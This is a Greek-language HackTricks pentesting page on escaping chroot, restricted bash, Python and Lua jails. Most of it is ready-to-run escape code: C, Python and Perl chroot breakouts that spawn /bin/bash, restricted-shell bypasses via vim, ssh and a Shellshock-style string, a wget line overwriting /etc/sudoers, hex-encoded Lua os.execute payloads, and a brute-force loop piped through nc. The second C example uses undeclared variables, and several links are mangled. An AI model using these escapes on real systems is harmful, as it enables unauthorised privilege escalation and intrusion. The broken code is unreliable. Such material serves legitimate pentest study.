# Διαφυγή από Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Αναζητήστε σε** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείτε να εκτελέσετε οποιοδήποτε δυαδικό με ιδιότητα "Shell"**

## Chroot Escapes

Από [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται για να υπερασπιστεί** ενάντια σε σκόπιμες παρεμβάσεις από **privileged** (**root**) **χρήστες**. Σε τα περισσότερα συστήματα, τα συμφραζόμενα chroot δεν στοιβάζονται σωστά και τα chrooted προγράμματα **με επαρκή δικαιώματα μπορεί να εκτελέσουν ένα δεύτερο chroot για να σπάσουν**.\
Συνήθως αυτό σημαίνει ότι για να διαφύγετε πρέπει να είστε root μέσα στο chroot.

> [!TIP]
> Το **εργαλείο** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να εκμεταλλευτεί τα παρακάτω σενάρια και να διαφύγει από το `chroot`.

### Root + CWD

> [!WARNING]
> Αν είστε **root** μέσα σε ένα chroot μπορείτε **να διαφύγετε** δημιουργώντας **ένα άλλο chroot**. Αυτό συμβαίνει γιατί 2 chroots δεν μπορούν να συνυπάρξουν (σε Linux), οπότε αν δημιουργήσετε έναν φάκελο και στη συνέχεια **δημιουργήσετε ένα νέο chroot** σε αυτόν τον νέο φάκελο ενώ **είστε έξω από αυτό**, θα είστε τώρα **έξω από το νέο chroot** και επομένως θα είστε στο FS.
>
> Αυτό συμβαίνει γιατί συνήθως το chroot ΔΕΝ μετακινεί τον τρέχοντα κατάλογό σας στον υποδεικνυόμενο, οπότε μπορείτε να δημιουργήσετε ένα chroot αλλά να είστε έξω από αυτό.

Συνήθως δεν θα βρείτε το δυαδικό `chroot` μέσα σε μια chroot φυλακή, αλλά θα **μπορούσατε να μεταγλωττίσετε, να ανεβάσετε και να εκτελέσετε** ένα δυαδικό:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτή την περίπτωση ο **επιτιθέμενος αποθηκεύει έναν περιγραφέα αρχείου στον τρέχοντα φάκελο** και στη συνέχεια **δημιουργεί το chroot σε έναν νέο φάκελο**. Τελικά, καθώς έχει **πρόσβαση** σε αυτόν τον **FD** **έξω** από το chroot, έχει πρόσβαση σε αυτόν και **διαφεύγει**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD μπορεί να περαστεί μέσω Unix Domain Sockets, οπότε:
>
> - Δημιουργήστε μια διαδικασία παιδί (fork)
> - Δημιουργήστε UDS ώστε ο γονέας και το παιδί να μπορούν να μιλούν
> - Εκτελέστε chroot στη διαδικασία παιδιού σε διαφορετικό φάκελο
> - Στη διαδικασία γονέα, δημιουργήστε ένα FD ενός φακέλου που είναι εκτός του νέου chroot της διαδικασίας παιδιού
> - Περάστε στη διαδικασία παιδιού αυτό το FD χρησιμοποιώντας το UDS
> - Η διαδικασία παιδιού chdir σε αυτό το FD, και επειδή είναι εκτός του chroot της, θα διαφύγει από τη φυλακή

### Root + Mount

> [!WARNING]
>
> - Τοποθέτηση της ρίζας συσκευής (/) σε έναν φάκελο μέσα στο chroot
> - Chrooting σε αυτόν τον φάκελο
>
> Αυτό είναι δυνατό σε Linux

### Root + /proc

> [!WARNING]
>
> - Τοποθέτηση του procfs σε έναν φάκελο μέσα στο chroot (αν δεν είναι ήδη)
> - Αναζητήστε ένα pid που έχει διαφορετική είσοδο root/cwd, όπως: /proc/1/root
> - Chroot σε αυτήν την είσοδο

### Root(?) + Fork

> [!WARNING]
>
> - Δημιουργήστε ένα Fork (παιδική διαδικασία) και chroot σε έναν διαφορετικό φάκελο πιο βαθιά στο FS και CD σε αυτόν
> - Από τη διαδικασία γονέα, μετακινήστε τον φάκελο όπου βρίσκεται η διαδικασία παιδί σε έναν φάκελο προηγούμενο από το chroot των παιδιών
> - Αυτή η διαδικασία παιδί θα βρει τον εαυτό της εκτός του chroot

### ptrace

> [!WARNING]
>
> - Πριν από καιρό, οι χρήστες μπορούσαν να αποσφαλματώσουν τις δικές τους διαδικασίες από μια διαδικασία του εαυτού τους... αλλά αυτό δεν είναι πλέον δυνατό από προεπιλογή
> - Ούτως ή άλλως, αν είναι δυνατόν, μπορείτε να ptrace σε μια διαδικασία και να εκτελέσετε ένα shellcode μέσα σε αυτήν ([δείτε αυτό το παράδειγμα](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Αποκτήστε πληροφορίες σχετικά με τη φυλακή:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Τροποποίηση του PATH

Ελέγξτε αν μπορείτε να τροποποιήσετε τη μεταβλητή περιβάλλοντος PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρησιμοποιώντας το vim
```bash
:set shell=/bin/sh
:shell
```
### Δημιουργία σεναρίου

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με _/bin/bash_ ως περιεχόμενο
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Πάρε bash από SSH

Αν αποκτάς πρόσβαση μέσω ssh, μπορείς να χρησιμοποιήσεις αυτό το κόλπο για να εκτελέσεις ένα bash shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Δηλώστε
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείτε να αντικαταστήσετε, για παράδειγμα, το αρχείο sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Άλλες τεχνικές

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
**Θα μπορούσε επίσης να είναι ενδιαφέρον η σελίδα:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Τεχνικές για την αποφυγή περιορισμών από python jails στη παρακάτω σελίδα:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Σε αυτή τη σελίδα μπορείτε να βρείτε τις παγκόσμιες συναρτήσεις στις οποίες έχετε πρόσβαση μέσα στο lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval με εκτέλεση εντολών:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Ορισμένα κόλπα για **να καλέσετε συναρτήσεις μιας βιβλιοθήκης χωρίς να χρησιμοποιήσετε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Καταγράψτε τις λειτουργίες μιας βιβλιοθήκης:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημειώστε ότι κάθε φορά που εκτελείτε την προηγούμενη μία γραμμή σε **διαφορετικό περιβάλλον lua η σειρά των συναρτήσεων αλλάζει**. Επομένως, αν χρειάζεται να εκτελέσετε μια συγκεκριμένη συνάρτηση, μπορείτε να εκτελέσετε μια επίθεση brute force φορτώνοντας διαφορετικά περιβάλλοντα lua και καλώντας την πρώτη συνάρτηση της βιβλιοθήκης:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Αποκτήστε διαδραστικό lua shell**: Εάν βρίσκεστε μέσα σε ένα περιορισμένο lua shell, μπορείτε να αποκτήσετε ένα νέο lua shell (και ελπίζουμε απεριόριστο) καλώντας:
```bash
debug.debug()
```
## Αναφορές

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Διαφάνειες: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
